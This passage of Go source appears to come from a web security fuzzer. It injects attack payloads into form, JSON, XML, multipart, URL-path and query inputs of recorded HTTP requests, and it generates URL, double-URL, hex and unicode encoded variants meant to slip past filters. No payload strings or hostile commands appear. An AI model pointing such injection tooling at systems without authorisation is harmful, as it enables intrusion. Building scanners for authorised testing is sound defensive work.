	baseForm.Set("name", "test")
	baseForm.Set("email", "test@test.com")
	baseForm.Set("data", "test")

	for attackType, payloads := range m.payloads {
		for _, payload := range payloads {
			// Create a copy of the form data
			mutatedForm := url.Values{}
			for key, values := range baseForm {
				mutatedForm[key] = values
			}

			// Inject payload into form values
			for key := range mutatedForm {
				mutatedForm.Set(key, payload.Value)
			}

			mutated := *req
			mutated.ID = generateID()
			mutated.Body = mutatedForm.Encode()
			mutated.ContentType = "application/x-www-form-urlencoded"
			mutated.Variant = fmt.Sprintf("form_%s_%s", attackType, payload.Variant)
			mutated.Timestamp = time.Now()
			mutations = append(mutations, mutated)
		}
	}

	return mutations
}

// mutateJSONBody injects payloads into JSON body
func (m *Mutator) mutateJSONBody(req *common.RecordedRequest) []common.RecordedRequest {
	var mutations []common.RecordedRequest

	var jsonData map[string]interface{}
	if err := json.Unmarshal([]byte(req.Body), &jsonData); err != nil {
		return mutations
	}

	for attackType, payloads := range m.payloads {
		for _, payload := range payloads {
			// Create a copy of the JSON data
			mutatedData := copyJSONMap(jsonData)

			// Inject payload into string values
			m.injectPayloadIntoJSON(mutatedData, payload.Value)

			// Convert back to JSON
			mutatedBody, err := json.Marshal(mutatedData)
			if err != nil {
				continue
			}

			mutated := *req
			mutated.ID = generateID()
			mutated.Body = string(mutatedBody)
			mutated.Variant = fmt.Sprintf("json_%s_%s", attackType, payload.Variant)
			mutated.Timestamp = time.Now()
			mutations = append(mutations, mutated)
		}
	}

	return mutations
}

// mutateFormBody injects payloads into form body
func (m *Mutator) mutateFormBody(req *common.RecordedRequest) []common.RecordedRequest {
	var mutations []common.RecordedRequest

	formData, err := url.ParseQuery(req.Body)
	if err != nil {
		return mutations
	}

	for attackType, payloads := range m.payloads {
		for _, payload := range payloads {
			// Create a copy of form data
			mutatedForm := make(url.Values)
			for key, values := range formData {
				mutatedForm[key] = values
			}

			// Inject payload into form values
			for key := range mutatedForm {
				mutatedForm.Set(key, payload.Value)
			}

			mutated := *req
			mutated.ID = generateID()
			mutated.Body = mutatedForm.Encode()
			mutated.Variant = fmt.Sprintf("form_%s_%s", attackType, payload.Variant)
			mutated.Timestamp = time.Now()
			mutations = append(mutations, mutated)
		}
	}

	return mutations
}

// mutateXMLBody injects payloads into XML body
func (m *Mutator) mutateXMLBody(req *common.RecordedRequest) []common.RecordedRequest {
	var mutations []common.RecordedRequest

	for attackType, payloads := range m.payloads {
		for _, payload := range payloads {
			// Simple XML injection - replace text content
			mutatedBody := strings.ReplaceAll(req.Body, ">test<", ">"+payload.Value+"<")

			mutated := *req
			mutated.ID = generateID()
			mutated.Body = mutatedBody
			mutated.Variant = fmt.Sprintf("xml_%s_%s", attackType, payload.Variant)
			mutated.Timestamp = time.Now()
			mutations = append(mutations, mutated)
		}
	}

	return mutations
}

// mutateMultipartBody injects payloads into multipart form data
func (m *Mutator) mutateMultipartBody(req *common.RecordedRequest) []common.RecordedRequest {
	var mutations []common.RecordedRequest

	for attackType, payloads := range m.payloads {
		for _, payload := range payloads {
			// Simple multipart injection - replace form field values
			mutatedBody := strings.ReplaceAll(req.Body, "\r\n\r\ntest\r\n", "\r\n\r\n"+payload.Value+"\r\n")

			mutated := *req
			mutated.ID = generateID()
			mutated.Body = mutatedBody
			mutated.Variant = fmt.Sprintf("multipart_%s_%s", attackType, payload.Variant)
			mutated.Timestamp = time.Now()
			mutations = append(mutations, mutated)
		}
	}

	return mutations
}

// mutateURL injects payloads into URL parameters and path
func (m *Mutator) mutateURL(req *common.RecordedRequest) []common.RecordedRequest {
	var mutations []common.RecordedRequest

	parsedURL, err := url.Parse(req.URL)
	if err != nil {
		return mutations
	}

	// URL Path mutations (for endpoints like /admin, /api, etc.)
	for attackType, payloads := range m.payloads {
		for _, payload := range payloads {
			// Create path-based mutations
			mutatedURL := *parsedURL

			// Add payload as a new path segment
			if parsedURL.Path == "/" {
				mutatedURL.Path = "/" + payload.Value
			} else {
				mutatedURL.Path = parsedURL.Path + "/" + payload.Value
			}

			mutated := *req
			mutated.ID = generateID()
			mutated.URL = mutatedURL.String()
			mutated.Variant = fmt.Sprintf("path_%s_%s", attackType, payload.Variant)
			mutated.Timestamp = time.Now()
			mutations = append(mutations, mutated)
		}
	}

	// URL Query parameter mutations
	query := parsedURL.Query()

	// If no query parameters exist, create some common ones to inject into
	if len(query) == 0 {
		commonParams := []string{"id", "user", "search", "q", "param", "value", "data"}
		for _, param := range commonParams {
			query.Set(param, "test")
		}
	}

	for attackType, payloads := range m.payloads {
		for _, payload := range payloads {
			// Create a copy of the URL
			mutatedURL := *parsedURL
			mutatedQuery := make(url.Values)
			for key, values := range query {
				mutatedQuery[key] = values
			}

			// Inject payload into query parameters
			for key := range mutatedQuery {
				mutatedQuery.Set(key, payload.Value)
			}

			mutatedURL.RawQuery = mutatedQuery.Encode()

			mutated := *req
			mutated.ID = generateID()
			mutated.URL = mutatedURL.String()
			mutated.Variant = fmt.Sprintf("query_%s_%s", attackType, payload.Variant)
			mutated.Timestamp = time.Now()
			mutations = append(mutations, mutated)
		}
	}

	return mutations
}

// injectPayloadIntoJSON recursively injects payload into JSON string values
func (m *Mutator) injectPayloadIntoJSON(data map[string]interface{}, payload string) {
	for key, value := range data {
		switch v := value.(type) {
		case string:
			data[key] = payload
		case map[string]interface{}:
			m.injectPayloadIntoJSON(v, payload)
		case []interface{}:
			for _, item := range v {
				if itemMap, ok := item.(map[string]interface{}); ok {
					m.injectPayloadIntoJSON(itemMap, payload)
				}
			}
		}
	}
}

// copyMap creates a deep copy of a map
func copyMap(original map[string]string) map[string]string {
	copied := make(map[string]string)
	for key, value := range original {
		copied[key] = value
	}
	return copied
}

// copyJSONMap creates a deep copy of a JSON map
func copyJSONMap(original map[string]interface{}) map[string]interface{} {
	copied := make(map[string]interface{})
	for key, value := range original {
		copied[key] = value
	}
	return copied
}

// generateID generates a unique ID
func generateID() string {
	return fmt.Sprintf("%d", time.Now().UnixNano())
}

// createEncodedVariations creates URL encoded variations of existing payloads
func (m *Mutator) createEncodedVariations() {
	for attackType, payloads := range m.payloads {
		var encodedPayloads []common.Payload

		for _, payload := range payloads {
			// Add original payload
			encodedPayloads = append(encodedPayloads, payload)

			// URL encoded variation
			urlEncoded := url.QueryEscape(payload.Value)
			if urlEncoded != payload.Value {
				encodedPayloads = append(encodedPayloads, common.Payload{
					Type:    payload.Type,
					Value:   urlEncoded,
					Variant: payload.Variant + "_url_encoded",
				})
			}

			// Double URL encoded variation
			doubleEncoded := url.QueryEscape(url.QueryEscape(payload.Value))
			if doubleEncoded != payload.Value && doubleEncoded != urlEncoded {
				encodedPayloads = append(encodedPayloads, common.Payload{
					Type:    payload.Type,
					Value:   doubleEncoded,
					Variant: payload.Variant + "_double_encoded",
				})
			}

			// Hex encoded variation (for special characters)
			hexEncoded := m.hexEncode(payload.Value)
			if hexEncoded != payload.Value {
				encodedPayloads = append(encodedPayloads, common.Payload{
					Type:    payload.Type,
					Value:   hexEncoded,
					Variant: payload.Variant + "_hex_encoded",
				})
			}

			// Unicode encoded variation
			unicodeEncoded := m.unicodeEncode(payload.Value)
			if unicodeEncoded != payload.Value {
				encodedPayloads = append(encodedPayloads, common.Payload{
					Type:    payload.Type,
					Value:   unicodeEncoded,
					Variant: payload.Variant + "_unicode_encoded",
				})
			}
		}

		// Update the payloads with encoded variations
		m.payloads[attackType] = encodedPayloads
	}
}

// hexEncode encodes special characters as hex
func (m *Mutator) hexEncode(input string) string {
	var result strings.Builder
	for _, char := range input {
		if char < 32 || char > 126 {
			result.WriteString(fmt.Sprintf("\\x%02x", char))
		} else {
			result.WriteRune(char)
		}
	}
	return result.String()
}

// unicodeEncode encodes special characters as unicode
func (m *Mutator) unicodeEncode(input string) string {
	var result strings.Builder
	for _, char := range input {
		if char < 32 || char > 126 {
			result.WriteString(fmt.Sprintf("\\u%04x", char))
		} else {
			result.WriteRune(char)
		}
	}
	return result.String()
}

// GetAllPayloads returns all payloads organized by attack type
func (m *Mutator) GetAllPayloads() map[string][]common.Payload {
	result := make(map[string][]common.Payload)
	for attackType, payloads := range m.payloads {
		result[string(attackType)] = payloads
	}
	return result
}

// GetPayloadsForType returns payloads for a specific attack type
func (m *Mutator) GetPayloadsForType(attackType common.AttackType) []common.Payload {
	if payloads, exists := m.payloads[attackType]; exists {
		return payloads
	}
	return []common.Payload{}
}
